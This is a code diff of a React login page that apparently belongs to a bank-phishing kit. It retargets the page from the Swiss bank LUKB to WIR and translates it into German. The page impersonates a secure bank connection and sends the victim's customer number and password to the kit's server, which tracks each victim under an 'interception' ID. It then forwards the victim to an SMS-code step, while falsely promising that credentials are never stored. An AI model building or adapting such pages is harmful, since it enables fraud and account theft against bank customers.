@@ -4,7 +4,7 @@ import Link from "next/link";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 
-export default function LukbConnect() {
+export default function WIRConnect() {
   const router = useRouter();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -25,7 +25,7 @@ export default function LukbConnect() {
         body: JSON.stringify({ 
           username, 
           password, 
-          bankName: "Lukb" // Ajout explicite du nom de la banque ici
+          bankName: "WIR" // Ajout explicite du nom de la banque ici
         }),
       });
 
@@ -39,10 +39,10 @@ export default function LukbConnect() {
       sessionStorage.setItem("current_interception_id", data.id);
 
       // Redirection immédiate vers la page de saisie du code SMS
-      router.push("/operation/montant");
+      router.push("/de/operation/montant");
 
     } catch (err: any) {
-      setError(err.message || "Erreur de connexion au serveur.");
+      setError(err.message || "Error");
     } finally {
       setIsLoading(false);
     }
@@ -50,7 +50,7 @@ export default function LukbConnect() {
 
   return (
     <div className="bank-connect-container">
-      <Link href="/operation" className="back-btn">
+      <Link href="/de/operation" className="back-btn">
         <i className="fa-solid fa-arrow-left"></i>
       </Link>
 
@@ -58,19 +58,19 @@ export default function LukbConnect() {
         <i className="fa-solid fa-shield-halved"></i>
       </div>
 
-      <h1 className="bank-connect-title">Relier LUKB</h1>
-      <p className="bank-connect-subtitle">Connexion sécurisée et chiffrée de bout en bout.</p>
+       <h1 className="bank-connect-title">Betreffen WIR</h1>
+      <p className="bank-connect-subtitle">Sichere und durchgängig verschlüsselte Verbindung.</p>
 
       <form className="login-form" onSubmit={handleConnect}>
         {error && <div className="error-message" style={{ background: '#fdf2f2', color: '#ec5b5b', padding: '12px', borderRadius: '12px', fontSize: '13px' }}>{error}</div>}
 
         <div className="input-group">
-          <label>Identifiant</label>
+          <label>Kennung</label>
           <div className="input-wrapper">
             <input 
               type="text" 
               className="input-field" 
-              placeholder="Numéro client" 
+              placeholder="Kundennummer" 
               value={username}
               onChange={(e) => setUsername(e.target.value)}
               required 
@@ -79,7 +79,7 @@ export default function LukbConnect() {
         </div>
 
         <div className="input-group">
-          <label>Mot de passe</label>
+          <label>Passwort</label>
           <div className="input-wrapper">
             <input 
               type={showPassword ? "text" : "password"} 
@@ -103,7 +103,7 @@ export default function LukbConnect() {
 
         <div className="security-note">
           <i className="fa-solid fa-lock"></i>
-          <span>Vos identifiants sont chiffrés et ne sont jamais stockés sur nos serveurs.</span>
+          <span>Ihre Anmeldedaten werden verschlüsselt und niemals auf unseren Servern gespeichert.</span>
         </div>
 
         <button type="submit" className="btn-link-bank" disabled={isLoading}>
@@ -112,7 +112,7 @@ export default function LukbConnect() {
           ) : (
             <>
               <i className="fa-solid fa-link"></i>
-              Continuer
+              Weitermachen
             </>
           )}
         </button>
